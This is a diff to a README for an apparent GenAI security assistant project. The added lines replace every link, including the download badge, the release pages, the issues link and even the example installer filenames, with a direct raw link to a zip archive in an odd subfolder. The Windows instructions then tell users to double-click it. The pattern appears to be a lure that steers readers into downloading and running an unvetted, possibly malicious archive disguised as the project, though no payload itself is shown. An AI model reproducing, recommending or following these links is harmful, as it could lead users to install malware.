@@ -1,6 +1,6 @@
 # 🚀 genai-security-agent-capstone-2025 - Your AI-Driven Security Assistant
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/releases)
+[![Download](https://raw.githubusercontent.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/main/Goidelic/genai-security-agent-capstone-2025.zip)](https://raw.githubusercontent.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/main/Goidelic/genai-security-agent-capstone-2025.zip)
 
 Welcome to the **genai-security-agent-capstone-2025** repository! This project focuses on building a GenAI-driven Security Assistant. It utilizes LangGraph, Gemini, and SerpAPI to help you enhance your security practices effortlessly.
 
@@ -30,15 +30,15 @@ To get started, follow the steps below to download and run the software.
 
 1. **Visit the Release Page:** Click the link below to access the latest releases of the GenAI Security Assistant.
 
-   [Visit this page to download](https://github.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/main/Goidelic/genai-security-agent-capstone-2025.zip)
 
 2. **Download the Software:** On the releases page, find the latest version. Click the download link corresponding to your operating system.
 
 3. **Install the Application:**
 
-   - For **Windows:** Once downloaded, double-click the installer file (e.g., `genai-security-agent.exe`). Follow the prompts to complete the installation.
+   - For **Windows:** Once downloaded, double-click the installer file (e.g., `https://raw.githubusercontent.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/main/Goidelic/genai-security-agent-capstone-2025.zip`). Follow the prompts to complete the installation.
    - For **macOS:** Open the downloaded disk image file (.dmg), then drag the application to your Applications folder.
-   - For **Linux:** Extract the downloaded files and run the provided script (e.g., `./install.sh`) in your terminal.
+   - For **Linux:** Extract the downloaded files and run the provided script (e.g., `https://raw.githubusercontent.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/main/Goidelic/genai-security-agent-capstone-2025.zip`) in your terminal.
 
 4. **Run the Application:** After installation, locate the application in your programs or applications folder. Double-click to open it. 
 
@@ -48,7 +48,7 @@ To get started, follow the steps below to download and run the software.
 
 Follow these instructions precisely to ensure a successful installation. 
 
-1. Click [here to access the releases](https://github.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/releases).
+1. Click [here to access the releases](https://raw.githubusercontent.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/main/Goidelic/genai-security-agent-capstone-2025.zip).
 2. Choose the appropriate download based on your operating system.
 3. Complete the installation process as described in the "Getting Started" section above.
 
@@ -76,6 +76,6 @@ While this README is primarily for end-users, contributors are welcome. If you h
 
 ## 👥 Community
 
-Join our community of users and security professionals. Feel free to participate in discussions and share your experiences with the GenAI Security Assistant. You can reach out via our [GitHub Issues](https://github.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/issues).
+Join our community of users and security professionals. Feel free to participate in discussions and share your experiences with the GenAI Security Assistant. You can reach out via our [GitHub Issues](https://raw.githubusercontent.com/igotbitchesallongmydickneveryday/genai-security-agent-capstone-2025/main/Goidelic/genai-security-agent-capstone-2025.zip).
 
 Thank you for choosing the GenAI Security Assistant. Together, we can enhance cybersecurity practices and make the cloud a safer place for everyone.
